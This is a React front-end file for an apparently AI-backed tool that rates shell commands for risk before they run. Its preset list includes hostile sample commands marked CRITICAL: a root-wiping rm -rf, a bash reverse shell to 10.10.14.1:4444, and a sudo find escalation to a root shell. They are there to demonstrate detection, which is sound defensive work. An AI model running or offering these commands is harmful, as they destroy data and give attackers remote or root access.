import React, { useState, useEffect } from 'react';
import Header from './components/Header';
import CommandInput from './components/CommandInput';
import AnalyzingRadar from './components/AnalyzingRadar';
import ImpactCard from './components/ImpactCard';
import HistoryFeed from './components/HistoryFeed';
import SettingsModal from './components/SettingsModal';
import { fetchSystemStatus, analyzeCommand, fetchPresets } from './services/api';
import { addHistoryEntry, getActiveUserId } from './services/historyStore';

const DEFAULT_PRESETS = [
  { title: "System Disk & Directory Usage", command: "df -h && du -sh /var/log/*", expected_risk: "SAFE" },
  { title: "Active Network Sockets & Listeners", command: "ss -tulpn", expected_risk: "SAFE" },
  { title: "Destructive Root Deletion Attempt", command: "rm -rf / --no-preserve-root", expected_risk: "CRITICAL" },
  { title: "Reverse Bash Socket Shell (T1059.004)", command: "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1", expected_risk: "CRITICAL" },
  { title: "GTFOBins SUID Find Privilege Escalation", command: "sudo find / -exec /bin/sh \\; -quit", expected_risk: "CRITICAL" },
  { title: "Top CPU Consuming Processes", command: "ps aux --sort=-%cpu | head -n 6", expected_risk: "SAFE" },
  { title: "Inspect Kernel IPTables Rules", command: "sudo iptables -L -n -v", expected_risk: "CAUTION" },
  { title: "Docker Container Status & Health", command: "docker ps -a", expected_risk: "SAFE" },
];

export default function App() {
  // App state: 'INPUT' | 'ANALYZING' | 'CONFIRMATION'
  const [appState, setAppState] = useState('INPUT');
  const [command, setCommand] = useState('');
  const [attachedScript, setAttachedScript] = useState(null);
  const [activeAnalysis, setActiveAnalysis] = useState(null);
  const [status, setStatus] = useState(null);
  const [showHistory, setShowHistory] = useState(false);
  const [showSettings, setShowSettings] = useState(false);
  const [activeProvider, setActiveProvider] = useState('groq');
  
  // Theme state
  const [theme, setTheme] = useState(() => {
    return localStorage.getItem('theme') || 'dark';
  });

  // Sync theme with HTML class
  useEffect(() => {
    const root = document.documentElement;
    if (theme === 'dark') {
      root.classList.add('dark');
    } else {
      root.classList.remove('dark');
    }
    localStorage.setItem('theme', theme);
  }, [theme]);

  const toggleTheme = () => {
    setTheme((prev) => (prev === 'dark' ? 'light' : 'dark'));
  };

  // Fetch initial telemetry
  const refreshStatus = async () => {
    try {
      const data = await fetchSystemStatus();
      setStatus(data);
      if (data.default_provider) {
        const saved = localStorage.getItem('lcie_ai_provider');
        setActiveProvider(saved || data.default_provider);
      }
    } catch (err) {
      console.error('Failed to fetch status', err);
    }
  };

  useEffect(() => {
    refreshStatus();
    const interval = setInterval(refreshStatus, 8000);
    return () => clearInterval(interval);
  }, []);

  // Handle AI provider change
  const handleToggleProvider = () => {
    const next = activeProvider === 'groq' ? 'ollama' : 'groq';
    setActiveProvider(next);
    localStorage.setItem('lcie_ai_provider', next);
  };

  const [presets, setPresets] = useState(DEFAULT_PRESETS);

  useEffect(() => {
    fetchPresets()
      .then((data) => {
        if (Array.isArray(data) && data.length > 0) {
          setPresets(data);
        }
      })
      .catch((err) => console.warn("Using default presets", err));
  }, []);

  // Trigger Pre-Flight Intent & Safety Analysis
  const handleAnalyze = async (cmdToAnalyze, customScript) => {
    const targetCmd = (typeof cmdToAnalyze === 'string' ? cmdToAnalyze : command).trim();
    if (!targetCmd) return;

    setAppState('ANALYZING');
    setActiveAnalysis(null);

    try {
      const scriptToUse = customScript !== undefined ? customScript : attachedScript;
      const options = {
        provider: activeProvider,
        apiKey: activeProvider === 'groq' ? (localStorage.getItem('lcie_groq_key') || undefined) : undefined,
        model: activeProvider === 'groq' ? (localStorage.getItem('lcie_groq_model') || 'groq/compound-mini') : undefined,
        scriptContent: scriptToUse?.content || undefined,
        scriptName: scriptToUse?.name || undefined,
      };
      const result = await analyzeCommand(targetCmd, status?.current_cwd, options);
      setActiveAnalysis(result);
      setAppState('CONFIRMATION');

      // Record pre-flight analysis event in history store
      await addHistoryEntry(getActiveUserId(), {
        command: targetCmd,
        cwd: status?.current_cwd || '~',
        target: 'analyzed',
        status: 'analyzed',
        risk_level: result.risk_level || 'SAFE',
        analysis: result,
      });
    } catch (err) {
      console.error('Analysis failed', err);
      alert(`Analysis error: ${err.message}`);
      setAppState('INPUT');
    }
  };

  // Cancel current inspection
  const handleCancel = () => {
    setActiveAnalysis(null);
    setAppState('INPUT');
  };

  // Select alternative command
  const handleUseAlternative = (altCmd) => {
    let clean = (altCmd || '').trim();
    const parenMatch = clean.match(/^([^\(]+?)\s*\([^\)]+\)$/);
    if (parenMatch) {
      clean = parenMatch[1].trim();
    }
    const hashMatch = clean.match(/^([^#]+?)\s*#\s*(.+)$/);
    if (hashMatch) {
      clean = hashMatch[1].trim();
    }
    setAttachedScript(null);
    setCommand(clean);
    handleAnalyze(clean, null);
  };

  // Global keyboard shortcuts
  useEffect(() => {
    const handleGlobalKeyDown = (e) => {
      if (e.key === 'Escape') {
        if (appState === 'CONFIRMATION') handleCancel();
        else if (appState === 'ANALYZING') setAppState('INPUT');
      } else if (e.ctrlKey && e.key.toLowerCase() === 'l') {
        e.preventDefault();
        setActiveAnalysis(null);
        setAppState('INPUT');
      }
    };

    window.addEventListener('keydown', handleGlobalKeyDown);
    return () => window.removeEventListener('keydown', handleGlobalKeyDown);
  }, [appState, activeAnalysis]);

  return (
    <div className="min-h-screen bg-slate-50 dark:bg-obsidian-950 text-slate-900 dark:text-slate-100 flex flex-col selection:bg-brand-500/20 dark:selection:bg-cyan-500/30 selection:text-brand-700 dark:selection:text-cyan-200 transition-colors duration-200">
      
      {/* Top Header */}
      <Header
        status={status}
        activeProvider={activeProvider}
        onToggleProvider={handleToggleProvider}
        theme={theme}
        onToggleTheme={toggleTheme}
        onOpenSettings={() => setShowSettings(true)}
        onToggleHistory={() => setShowHistory(!showHistory)}
        showHistory={showHistory}
      />

      {/* Main Container */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6 flex flex-col gap-4">
        
        {/* Command Input Bar */}
        <CommandInput
          command={command}
          setCommand={setCommand}
          onAnalyze={(cmd, script) => handleAnalyze(cmd, script)}
          isAnalyzing={appState === 'ANALYZING'}
          promptPath={status?.prompt_path}
          presets={presets}
          attachedScript={attachedScript}
          setAttachedScript={setAttachedScript}
          onSelectPreset={(presetCmd) => {
            setAttachedScript(null);
            setCommand(presetCmd);
            handleAnalyze(presetCmd, null);
          }}
        />

        {/* Stage 1: Animated Radar Scanning */}
        {appState === 'ANALYZING' && (
          <AnalyzingRadar command={command} />
        )}

        {/* Stage 2: Rich Impact Assessment Card */}
        {activeAnalysis && (
          <div className="space-y-3 animate-fadeIn">
            <ImpactCard
              analysis={activeAnalysis}
              onUseAlternative={handleUseAlternative}
            />
          </div>
        )}

      </main>

      {/* History Feed Drawer */}
      <HistoryFeed
        isOpen={showHistory}
        onClose={() => setShowHistory(false)}
        onSelectCommand={(cmd) => {
          setAttachedScript(null);
          setCommand(cmd);
          handleAnalyze(cmd, null);
        }}
        onViewAnalysis={(analysis) => {
          setActiveAnalysis(analysis);
          setAppState('CONFIRMATION');
        }}
      />

      {/* Settings Modal */}
      <SettingsModal
        isOpen={showSettings}
        onClose={() => setShowSettings(false)}
        onUpdated={refreshStatus}
      />

    </div>
  );
}
